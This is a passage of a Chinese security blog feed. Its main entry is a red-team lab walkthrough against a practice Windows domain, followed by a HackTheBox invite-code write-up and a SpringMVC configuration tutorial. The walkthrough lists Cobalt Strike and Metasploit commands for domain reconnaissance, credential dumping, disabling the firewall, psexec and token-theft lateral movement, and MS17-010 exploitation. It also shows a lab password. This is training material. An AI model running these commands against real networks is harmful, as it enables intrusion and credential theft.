本机信息收集"></a>001 本机信息收集</h4><p>因为不存在杀软环境所以将CS的心跳值调低为0提高效率，进入上线主机beacon执行sleep命令：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/18.png" alt></p><blockquote><p>心跳时间是指上线的服务器和cs服务器的通信时间。在cs中默认的心跳时间是60s,我们可以用sleep 命令来更改心跳时间；心跳时间很长就会响应的时间很慢，但也不能设置的很短，不让很容易会被监测到与cs通信的流量，具体多少可以根据测试环境自己来设置。上图设置后为0执行命令马上获得结果回显。</p></blockquote><p>使用CS进行本机信息收集，下面是常见的命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查看用户名：shell whoami</span><br><span class="line">查看主机名：shell hostname</span><br><span class="line">查看用户：shell <span class="built_in">net</span> user</span><br><span class="line">查看管理员：shell <span class="built_in">net</span> localgroup administrators</span><br><span class="line">查看系统详细信息：shell systeminfo</span><br><span class="line">查看操作系统 &amp; 系统版本：shell systeminfo | <span class="built_in">findstr</span> /B /C:"OS 名称" /C:"OS 版本"</span><br><span class="line">查看操作系统 &amp; 系统版本：shell systeminfo | <span class="built_in">findstr</span> /B /C:"OS Name" /C:"OS Version"</span><br><span class="line">查询已安装的软件及版本信息：shell wmic product get name,version</span><br><span class="line">查询进程及服务：shell tasklist /svc</span><br><span class="line">查询进程及服务：shell wmic process list brief</span><br></pre></td></tr></table></figure><p>执行后就会返回结果：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/19.png" alt></p><p>系统版本信息和安装的服务等：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/20.png" alt></p><p>本机的信息收集在网上能看到很多教程，需要的话就搜索对应的命令即可。重点还是在于域的信息收集。</p><h4 id="002-域信息收集"><a href="#002-域信息收集" class="headerlink" title="002 域信息收集"></a>002 域信息收集</h4><h5 id="00-是否存在域环境"><a href="#00-是否存在域环境" class="headerlink" title="00 是否存在域环境"></a>00 是否存在域环境</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看DNS服务器：shell <span class="built_in">ipconfig</span> /all </span><br><span class="line">查看主域信息：shell <span class="built_in">net</span> view /domain</span><br><span class="line">查看时间服务器：shell <span class="built_in">net</span> <span class="built_in">time</span> /domain</span><br><span class="line">查询当前的登录域与用户信息：shell <span class="built_in">net</span> config workstation</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/21.png" alt></p><p>上面可以看到发现DNS服务器名为god.org，继续执行命令收集更多域相关信息：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/22.png" alt></p><h5 id="01-寻找域控"><a href="#01-寻找域控" class="headerlink" title="01 寻找域控"></a>01 寻找域控</h5><p>使用下面命令定位到域控的地址：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell nslookup god.org</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/23.png" alt></p><p>确定了内网网段中域控的ip地址是：192.168.72.138</p><h5 id="02-查询域控和用户信息"><a href="#02-查询域控和用户信息" class="headerlink" title="02 查询域控和用户信息"></a>02 查询域控和用户信息</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查看当前域的所有用户：shell <span class="built_in">net</span> user /domain</span><br><span class="line">获取域内用户的详细信息：shell wmic useraccount get /all</span><br><span class="line">查看所有域成员计算机列表：shell <span class="built_in">net</span> group "domain computers" /domain</span><br><span class="line">查看域管理员：shell <span class="built_in">net</span> group "domain admins" /domain</span><br><span class="line">查看域控制器：shell <span class="built_in">net</span> group "domain controllers" /domain</span><br><span class="line">查看企业管理组：shell <span class="built_in">net</span> group "enterprise admins" /domain</span><br><span class="line">查看域控，升级为域控时，本地账户也成为域管：shell <span class="built_in">net</span> localgroup administrators /domain</span><br><span class="line">获取域密码信息：shell <span class="built_in">net</span> accounts /domain</span><br><span class="line">获取域信任信息 (cs里执行提示不是内部或外部命令)：shell nltest /domain_trusts</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/24.png" alt></p><h5 id="03-提权"><a href="#03-提权" class="headerlink" title="03 提权"></a>03 提权</h5><p>在执行net user /domain时提示拒绝访问，权限不足。使用CS自带的提权进行操作：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/25.png" alt></p><p>等待一个新的shell上线即可，这里返回高权限shell使用的是svc-exe插件：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/34.png" alt></p><p>有个system就可以可以进行高权限操作了：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/26.png" alt></p><p>查询剩余的域相关信息：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/27.png" alt></p><p>下面就针对域收集到的信息进行横向探测。</p><h3 id="01-横向探测"><a href="#01-横向探测" class="headerlink" title="01 横向探测"></a>01 横向探测</h3><h4 id="001-抓取凭证和密码"><a href="#001-抓取凭证和密码" class="headerlink" title="001 抓取凭证和密码"></a>001 抓取凭证和密码</h4><p>使用net view探测域中其他机器，然后选择view中的targets即可看到域其他目标：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/28.png" alt></p><p>然后使用hashdump和logonpasswords抓取出凭证以及登录密码：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/29.png" alt></p><p>选择view中的credentials即可看到抓取的密码和凭证：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/30.png" alt></p><h4 id="002-探测主机"><a href="#002-探测主机" class="headerlink" title="002 探测主机"></a>002 探测主机</h4><h5 id="00-ping命令"><a href="#00-ping命令" class="headerlink" title="00 ping命令"></a>00 ping命令</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="keyword">for</span> /L %I <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">DO</span> @<span class="built_in">ping</span> -w <span class="number">1</span> -n <span class="number">1</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.%I | <span class="built_in">findstr</span> "TTL="</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/31.png" alt></p><p>使用ping命令如果存活的主机就会ttl字段，我们以此进行作为判别依据，遍历ip进行主机探测。</p><h5 id="01-arp命令"><a href="#01-arp命令" class="headerlink" title="01 arp命令"></a>01 arp命令</h5><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/35.png" alt></p><p>直接了当的命令，查看局域网内的其他机器的mac信息，以此探测主机。</p><h5 id="03-lodan扫描"><a href="#03-lodan扫描" class="headerlink" title="03 lodan扫描"></a>03 lodan扫描</h5><p>使用CS的脚本管理器载入ladon的cna文件，就能在上线主机右键中使用ladon的功能：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/44.png" alt></p><p>然后将Ladon.exe和Ladon.cna放进CS目录中的third-party就可以在beacon中使用Ladon命令：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/45.png" alt></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">扫描网段内存活主机信息：Ladon <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">0</span>/<span class="number">24</span> OsScan</span><br><span class="line">扫描网段内存在MS17-<span class="number">010</span>：Ladon <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">0</span>/<span class="number">24</span> MS17010</span><br></pre></td></tr></table></figure><h3 id="02-横向移动"><a href="#02-横向移动" class="headerlink" title="02 横向移动"></a>02 横向移动</h3><h5 id="00-SMB-Beacon"><a href="#00-SMB-Beacon" class="headerlink" title="00 SMB Beacon"></a>00 SMB Beacon</h5><blockquote><p>SMB Beacon 使用命名管道通过父级 Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 从父 Beacon 获取到任务并发送。因为链接的 Beacons 使用 Windows 命名管道进行通信，此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽，绕防火墙时可能发挥奇效 。</p></blockquote><p>新增一个smb的监听器，选择payload为Beacon_SMB：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/32.png" alt></p><p>在已有的beacon中选择一个点击右键，选择Spawn：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/33.png" alt></p><p>选择后等待反弹一个子shell，其图标中会带有链接：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/36.png" alt></p><p>这就是派生的 SMB Beacon，我们可以在主Beacon上用link host连接它，或者unlink host断开它：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/37.png" alt></p><h5 id="01-psexec使用凭证登录"><a href="#01-psexec使用凭证登录" class="headerlink" title="01 psexec使用凭证登录"></a>01 psexec使用凭证登录</h5><p>前面我们抓取了现有beacon中的凭证，可以通过credentials窗口查看。接着在targets中选择非域控主机，右键选择jump中的psexec：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/38.png" alt></p><p>在弹出的窗口中选择使用 god.org 的 Administrator 的凭证信息，然后监听器选择刚才创建的 smb beacon，会话也选择对应的 smb beacon 的会话：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/39.png" alt></p><blockquote><p>复现登录失败，记得是之前修改过域服务器的登录密码，所以原来mimikatz抓取的密码是旧的无法登录。使用AD重新修改密码为hongrisec@2019重新尝试。</p></blockquote><p>成功执行psexec获取到非域控的域服务器：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/40.png" alt></p><p>验证确实控制的是windows server 2003服务器：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/41.png" alt></p><p>相同方法获取到域控的shell：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/42.png" alt></p><p>同样进入beacon执行命令验证成功：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/43.png" alt></p><h5 id="02-窃取token横向"><a href="#02-窃取token横向" class="headerlink" title="02 窃取token横向"></a>02 窃取token横向</h5><p>选择beacon右键的进程列表：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/46.png" alt></p><p>在弹出的进程列表中选择域控的进程并且窃取token：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/47.png" alt></p><p>然后使用psexec时选择使用当前token即可，执行后等待传回beacon即可：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/48.png" alt></p><blockquote><p>前面的psexec能迅速地获得域控主机的beacon是因为我们读取到了域管理员账号密码的 hash，但是一般情况下，我们是获取不到的。得学会使用其他不同的方式进行横向。</p></blockquote><h5 id="03-使用msf横向"><a href="#03-使用msf横向" class="headerlink" title="03 使用msf横向"></a>03 使用msf横向</h5><blockquote><p>MSF路由转发：即MSF的跳板功能，其实是MSF框架中自带的一个路由转发功能。实现过程就是MSF框架在已经获取的meterpreter shell的基础上添加一条去往“内网”的路由，此路由的下一跳转发，即网关是MSF攻击平台与被攻击目标建立的一个session会话。</p></blockquote><p>打开msf然后执行命令查看并添加路由：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br><span class="line">run autoroute -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure><blockquote><p>在此sessions中添加路由，使得返回到MSF的shell能够通过session进行路由转发访问到192.168.72.0网段。 </p></blockquote><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/49.png" alt></p><p>查看是否添加成功：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/53.png" alt></p><p>使用arp扫描网段主机：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=<span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><blockquote><p>探测主机这块前面也有使用CS操作的方法，这里使用msf是为了记录更加全面。</p></blockquote><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/50.png" alt></p><p>我们直接攻击域控，首先关闭跳板机的防火墙：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell // 打开肉鸡的shell</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br><span class="line"><span class="keyword">exit</span> // 返回meterpreter的shell</span><br></pre></td></tr></table></figure><blockquote><p>msf进入meterpreter使用“sessions 序号”命令；meterpreter进入msf使用“background”命令；mterpreter进入肉鸡shell使用“shell“命令；肉鸡shell进入meterpreter使用”exit“命令；msf装载payload返回无装载的msf使用”back“命令。</p></blockquote><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/51.png" alt></p><p>关闭后使用background命令回到msf，使用MS17-010插件进行扫描：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"><span class="built_in">set</span> threads <span class="number">50</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/52.png" alt></p><p>扫描出域控存在MS17-010漏洞！其他标注红框就是为了说明前面引用中不同的shell如何转换。下面使用MS17-010进行攻击获取shell，执行下面命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">138</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/54.png" alt></p><p>可以看到执行成功但是没有创建session，重新看看有那些可用模块。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17</span><br></pre></td></tr></table></figure><p>搜索可用的模块，经过网上查阅似乎只有使用5和11才能攻击成功：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/55.png" alt></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">show options // 默认执行的命令是<span class="built_in">net</span> group "Domain Admins" /domain”、</span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">138</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/56.png" alt></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> Rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">138</span></span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">128</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>这种方式也没有获取到shell，有机会再继续补充其他渗透的手法。</p><p>参考链接：</p><p><a href="https://soapffz.com/sec/558.html#menu_index_16" target="_blank" rel="noopener">https://soapffz.com/sec/558.html#menu_index_16</a></p><p><a href="https://www.freebuf.com/column/231111.html" target="_blank" rel="noopener">https://www.freebuf.com/column/231111.html</a></p><p><a href="https://www.freebuf.com/articles/web/252594.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/252594.html</a></p><p><a href="https://www.anquanke.com/post/id/86505" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86505</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;红队靶场评估-1&quot;&gt;&lt;a href=&quot;#红队靶场评估-1&quot; class=&quot;headerlink&quot; title=&quot;红队靶场评估-1&quot;&gt;&lt;/a&gt;红队靶场评估-1&lt;/h1&gt;&lt;p&gt;学习学习，记录记录。感谢红日安全团队：&lt;a href=&quot;http://vulnstack.q
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>HackTheBox注册</title>
    <link href="http://bai-ren-1.github.io/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/"/>
    <id>http://bai-ren-1.github.io/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/</id>
    <published>2020-12-26T03:52:41.000Z</published>
    <updated>2020-12-26T04:03:49.835Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HackTheBox注册"><a href="#HackTheBox注册" class="headerlink" title="HackTheBox注册"></a>HackTheBox注册</h1><p><a href="https://www.hackthebox.eu/invite" target="_blank" rel="noopener">https://www.hackthebox.eu/invite</a></p><h2 id="0x00-JS接口"><a href="#0x00-JS接口" class="headerlink" title="0x00 JS接口"></a>0x00 JS接口</h2><p>注册需要邀请码，然鹅提示只需要hack这个页面就有邀请码。直接来个hint，提示控制台：</p><p><img src="/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/1.png" alt></p><p>可以看到很明显的提示，加载了一个JS文件：</p><p><img src="/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/2.png" alt></p><p>那么就去加载文件里面翻一翻：</p><p><img src="/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/3.png" alt></p><p>看到inviteapi这个文件名很不一般，把JS代码放在美化网站里：</p><p><img src="/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/4.png" alt></p><p>看到了通过这个makeInviteCode函数发出ajax请求，我们去访问这个api：</p><p><img src="/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/5.png" alt></p><p>将得到的json数据进行base64解码：</p><p><img src="/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/6.png" alt></p><p>又提示了另一个接口，发送请求：</p><p><img src="/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/7.png" alt></p><p>code就是base64加密的邀请码啦。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;HackTheBox注册&quot;&gt;&lt;a href=&quot;#HackTheBox注册&quot; class=&quot;headerlink&quot; title=&quot;HackTheBox注册&quot;&gt;&lt;/a&gt;HackTheBox注册&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.hackthebo
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SpringMVC实践</title>
    <link href="http://bai-ren-1.github.io/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/"/>
    <id>http://bai-ren-1.github.io/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/</id>
    <published>2020-12-26T03:10:16.000Z</published>
    <updated>2020-12-26T03:16:01.748Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SpringMVC实践"><a href="#SpringMVC实践" class="headerlink" title="SpringMVC实践"></a>SpringMVC实践</h1><p><a href="https://blog.csdn.net/qq_33369905/article/details/105828924" target="_blank" rel="noopener">https://blog.csdn.net/qq_33369905/article/details/105828924</a></p><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/14.png" alt></p><h2 id="0x00-注解式基本步骤"><a href="#0x00-注解式基本步骤" class="headerlink" title="0x00 注解式基本步骤"></a>0x00 注解式基本步骤</h2><blockquote><p>实现接口式的实现没啥人用了，下面的关键注解就是@Controller和@RequestMapping。</p></blockquote><h3 id="1、新建maven工程，然后新增框架修改为webapp"><a href="#1、新建maven工程，然后新增框架修改为webapp" class="headerlink" title="1、新建maven工程，然后新增框架修改为webapp"></a>1、新建maven工程，然后新增框架修改为webapp</h3><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/1.png" alt></p><h3 id="2、在web-xml添加DispatcherServlet的servlet配置以及servlet-mapping配置"><a href="#2、在web-xml添加DispatcherServlet的servlet配置以及servlet-mapping配置" class="headerlink" title="2、在web.xml添加DispatcherServlet的servlet配置以及servlet-mapping配置"></a>2、在web.xml添加DispatcherServlet的servlet配置以及servlet-mapping配置</h3><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/2.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">        xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">        xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class="line">        version=&quot;4.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">   &lt;!--1.注册servlet--&gt;</span><br><span class="line">   &lt;servlet&gt;</span><br><span class="line">       &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;</span><br><span class="line">       &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;</span><br><span class="line">       &lt;!--通过初始化参数指定SpringMVC配置文件的位置，进行关联--&gt;</span><br><span class="line">       &lt;init-param&gt;</span><br><span class="line">           &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">           &lt;param-value&gt;classpath:springmvc-servlet.xml&lt;/param-value&gt;</span><br><span class="line">       &lt;/init-param&gt;</span><br><span class="line">       &lt;!-- 启动顺序，数字越小，启动越早 --&gt;</span><br><span class="line">       &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">   &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">   &lt;!--所有请求都会被springmvc拦截 --&gt;</span><br><span class="line">   &lt;servlet-mapping&gt;</span><br><span class="line">       &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;</span><br><span class="line">       &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">   &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">   &lt;filter&gt;</span><br><span class="line">       &lt;filter-name&gt;encoding&lt;/filter-name&gt;</span><br><span class="line">       &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;</span><br><span class="line">       &lt;init-param&gt;</span><br><span class="line">           &lt;param-name&gt;encoding&lt;/param-name&gt;</span><br><span class="line">           &lt;param-value&gt;utf-8&lt;/param-value&gt;</span><br><span class="line">       &lt;/init-param&gt;</span><br><span class="line">   &lt;/filter&gt;</span><br><span class="line">   &lt;filter-mapping&gt;</span><br><span class="line">       &lt;filter-name&gt;encoding&lt;/filter-name&gt;</span><br><span class="line">       &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">   &lt;/filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><h3 id="3、配置里面映射的spring配置文件"><a href="#3、配置里面映射的spring配置文件" class="headerlink" title="3、配置里面映射的spring配置文件"></a>3、配置里面映射的spring配置文件</h3><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/3.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       